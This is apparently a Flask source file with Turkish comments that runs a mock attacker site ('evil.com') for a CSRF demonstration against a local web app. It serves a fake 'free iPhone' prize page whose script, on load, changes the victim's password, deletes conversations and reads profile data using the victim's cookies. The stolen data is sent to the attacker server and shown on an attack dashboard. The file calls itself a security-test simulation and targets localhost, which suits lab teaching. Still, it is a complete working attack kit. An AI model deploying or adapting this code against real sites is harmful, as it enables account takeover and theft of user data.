"""
Evil Server - CSRF Saldırı Simülasyonu
Bu sunucu saldırgan'ın (evil.com) web sitesini simulate eder
"""

from flask import Flask, render_template_string, request, jsonify
from flask_cors import CORS
import json
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Saldırı logları
attack_logs = []

def log_attack(attack_type, details):
    """Saldırı başarısını logla"""
    log = {
        "timestamp": datetime.now().isoformat(),
        "type": attack_type,
        "details": details,
        "victim_ip": request.remote_addr
    }
    attack_logs.append(log)
    print(f"🔴 {attack_type}: {details}")
    return log

# Evil.com ana sayfası (saldırı sayfası)
EVIL_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>🎁 ÜCRETSİZ İPHONE 15 PRO KAZAN!</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 600px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        
        h1 {
            color: #667eea;
            font-size: 2.5em;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        .prize {
            font-size: 5em;
            margin: 20px 0;
        }
        
        .message {
            font-size: 1.2em;
            color: #333;
            margin: 20px 0;
            line-height: 1.6;
        }
        
        .loading {
            display: none;
            margin: 20px 0;
        }
        
        .loading.active {
            display: block;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .status {
            margin-top: 20px;
            font-weight: bold;
            color: #764ba2;
        }
        
        .hidden-attacks {
            display: none;
        }
        
        .attack-log {
            margin-top: 30px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 10px;
            text-align: left;
            font-family: monospace;
            font-size: 0.9em;
        }
        
        .success {
            color: #28a745;
        }
        
        .error {
            color: #dc3545;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎉 TEBRİKLER! 🎉</h1>
        <div class="prize">📱</div>
        <div class="message">
            <p><strong>iPhone 15 Pro Max</strong> kazandınız!</p>
            <p>Ödülünüzü almak için lütfen bekleyin...</p>
        </div>
        
        <div class="loading active">
            <div class="spinner"></div>
            <div class="status" id="status">Ödül bilgileri yükleniyor...</div>
        </div>
        
        <div class="attack-log">
            <strong>🔴 CSRF SALDIRI LOGU (DEMO)</strong>
            <div id="log"></div>
        </div>
    </div>
    
    <!-- GİZLİ FORMLAR - Kullanıcı görmüyor! -->
    <div class="hidden-attacks">
        <!-- Saldırı 1: Şifre değiştirme -->
        <form id="attack1" action="http://localhost:8000/api/users/change-password" method="POST">
            <input type="hidden" name="current_password" value="dummy">
            <input type="hidden" name="new_password" value="HACKED_BY_CSRF_2025">
        </form>
        
        <!-- Saldırı 2: Profil güncelleme -->
        <form id="attack2" action="http://localhost:8000/api/users/me" method="PUT">
            <input type="hidden" name="full_name" value="🔴 HACKED BY CSRF">
            <input type="hidden" name="email" value="hacked@evil.com">
        </form>
        
        <!-- Saldırı 3: Conversation silme (ID tahmin edilecek) -->
        <form id="attack3" action="http://localhost:8000/api/conversations/1" method="DELETE">
        </form>
    </div>
    
    <script>
        const log = document.getElementById('log');
        const status = document.getElementById('status');
        
        function addLog(message, isSuccess = true) {
            const div = document.createElement('div');
            div.className = isSuccess ? 'success' : 'error';
            div.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            log.appendChild(div);
        }
        
        async function executeCSRFAttacks() {
            addLog('🚀 CSRF Saldırısı başlatılıyor...');
            
            // Saldırı 1: Şifre değiştirme (JavaScript fetch ile)
            status.textContent = '📦 Ödül paketiniz hazırlanıyor...';
            await sleep(1000);
            
            try {
                addLog('🎯 Saldırı 1: Şifre değiştirme...');
                
                const changePasswordResponse = await fetch('http://localhost:8000/api/users/change-password', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    credentials: 'include',  // Cookie'leri gönder!
                    body: JSON.stringify({
                        current_password: 'dummy',
                        new_password: 'HACKED_BY_CSRF_2025'
                    })
                });
                
                if (changePasswordResponse.ok) {
                    addLog('✅ Şifre başarıyla değiştirildi!', true);
                    reportSuccess('password_change', 'Şifre: HACKED_BY_CSRF_2025');
                } else {
                    const errorText = await changePasswordResponse.text();
                    addLog(`❌ Şifre değiştirilemedi: ${changePasswordResponse.status}`, false);
                    addLog(`   Detay: ${errorText.substring(0, 100)}`, false);
                }
            } catch (e) {
                addLog(`❌ Şifre değiştirme hatası: ${e.message}`, false);
            }
            
            await sleep(1500);
            
            // Saldırı 2: Conversation silme denemesi
            status.textContent = '🎁 Ödülünüz paketleniyor...';
            
            try {
                addLog('🎯 Saldırı 2: Conversation silme...');
                
                // Birkaç ID dene (1-10 arası)
                for (let convId = 1; convId <= 5; convId++) {
                    const deleteResponse = await fetch(`http://localhost:8000/api/conversations/${convId}`, {
                        method: 'DELETE',
                        credentials: 'include'
                    });
                    
                    if (deleteResponse.ok) {
                        addLog(`✅ Conversation ${convId} silindi!`, true);
                        reportSuccess('conversation_delete', `Conv ID: ${convId}`);
                    } else if (deleteResponse.status === 404) {
                        addLog(`⚠️  Conversation ${convId} bulunamadı`, false);
                    } else {
                        addLog(`❌ Conversation ${convId} silinemedi: ${deleteResponse.status}`, false);
                    }
                    
                    await sleep(300);
                }
            } catch (e) {
                addLog(`❌ Conversation silme hatası: ${e.message}`, false);
            }
            
            await sleep(1500);
            
            // Saldırı 3: Profil okuma (bilgi toplama)
            status.textContent = '📋 Bilgileriniz doğrulanıyor...';
            
            try {
                addLog('🎯 Saldırı 3: Kullanıcı bilgisi çalma...');
                
                const profileResponse = await fetch('http://localhost:8000/api/users/me', {
                    method: 'GET',
                    credentials: 'include'
                });
                
                if (profileResponse.ok) {
                    const userData = await profileResponse.json();
                    addLog(`✅ Kullanıcı bilgileri çalındı!`, true);
                    addLog(`   User: ${userData.username || 'N/A'}`, true);
                    addLog(`   Email: ${userData.email || 'N/A'}`, true);
                    addLog(`   ID: ${userData.id || 'N/A'}`, true);
                    reportSuccess('user_data_theft', JSON.stringify(userData));
                } else {
                    addLog(`❌ Kullanıcı bilgileri alınamadı: ${profileResponse.status}`, false);
                }
            } catch (e) {
                addLog(`❌ Profil okuma hatası: ${e.message}`, false);
            }
            
            await sleep(1500);
            
            // Final
            status.textContent = '✅ İşlem tamamlandı!';
            addLog('');
            addLog('🏁 CSRF saldırısı tamamlandı!');
            addLog('📊 Sonuçlar evil.com sunucusuna gönderildi.');
            addLog('');
            addLog('⚠️  NOT: Bu bir güvenlik testi simülasyonudur!');
        }
        
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        async function reportSuccess(attackType, details) {
            // Evil sunucuya başarıyı bildir
            try {
                await fetch('http://localhost:5000/report-success', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        attack_type: attackType,
                        details: details,
                        timestamp: new Date().toISOString()
                    })
                });
            } catch (e) {
                console.error('Report failed:', e);
            }
        }
        
        // Sayfa yüklendiğinde saldırıyı başlat
        window.onload = function() {
            setTimeout(executeCSRFAttacks, 2000);
        };
    </script>
</body>
</html>
"""

@app.route('/')
def evil_home():
    """Evil.com ana sayfası"""
    return render_template_string(EVIL_PAGE)

@app.route('/report-success', methods=['POST'])
def report_success():
    """Başarılı saldırıları logla"""
    data = request.json
    log_attack(data['attack_type'], data['details'])
    return jsonify({"status": "logged"})

@app.route('/stats')
def stats():
    """Saldırı istatistikleri"""
    return jsonify({
        "total_attacks": len(attack_logs),
        "attacks": attack_logs
    })

@app.route('/dashboard')
def dashboard():
    """Saldırgan dashboard'u"""
    dashboard_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>🔴 Evil.com - Attack Dashboard</title>
        <style>
            body {
                font-family: monospace;
                background: #1a1a1a;
                color: #00ff00;
                padding: 20px;
            }
            .header {
                background: #2a2a2a;
                padding: 20px;
                border-radius: 10px;
                margin-bottom: 20px;
            }
            .stats {
                background: #2a2a2a;
                padding: 20px;
                border-radius: 10px;
            }
            .attack {
                border-left: 3px solid #ff0000;
                padding: 10px;
                margin: 10px 0;
                background: #3a3a3a;
            }
            .success {
                color: #00ff00;
            }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🔴 EVIL.COM - CSRF Attack Dashboard</h1>
            <p>Monitoring CSRF attacks against localhost:8000</p>
        </div>
        
        <div class="stats">
            <h2>📊 Attack Statistics</h2>
            <p>Total Successful Attacks: <span id="total">0</span></p>
            <button onclick="loadStats()">Refresh</button>
            <div id="attacks"></div>
        </div>
        
        <script>
            async function loadStats() {
                const response = await fetch('/stats');
                const data = await response.json();
                
                document.getElementById('total').textContent = data.total_attacks;
                
                const attacksDiv = document.getElementById('attacks');
                attacksDiv.innerHTML = '';
                
                data.attacks.forEach(attack => {
                    const div = document.createElement('div');
                    div.className = 'attack success';
                    div.innerHTML = `
                        <strong>${attack.type}</strong><br>
                        Time: ${attack.timestamp}<br>
                        Details: ${attack.details}<br>
                        Victim IP: ${attack.victim_ip}
                    `;
                    attacksDiv.appendChild(div);
                });
            }
            
            setInterval(loadStats, 3000);
            loadStats();
        </script>
    </body>
    </html>
    """
    return render_template_string(dashboard_html)

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║         🔴 EVIL.COM - CSRF Attack Server             ║
    ╠═══════════════════════════════════════════════════════╣
    ║  Port: 5000                                           ║
    ║  Evil Page: http://localhost:5000                     ║
    ║  Dashboard: http://localhost:5000/dashboard           ║
    ║  Stats: http://localhost:5000/stats                   ║
    ║                                                       ║
    ║  ⚠️  BU BİR GÜVENLİK TESTİ SİMÜLASYONUDUR!         ║
    ║  SADECE KENDİ SİSTEMLERİNİZDE KULLANIN!              ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    
    app.run(host='0.0.0.0', port=5000, debug=True)
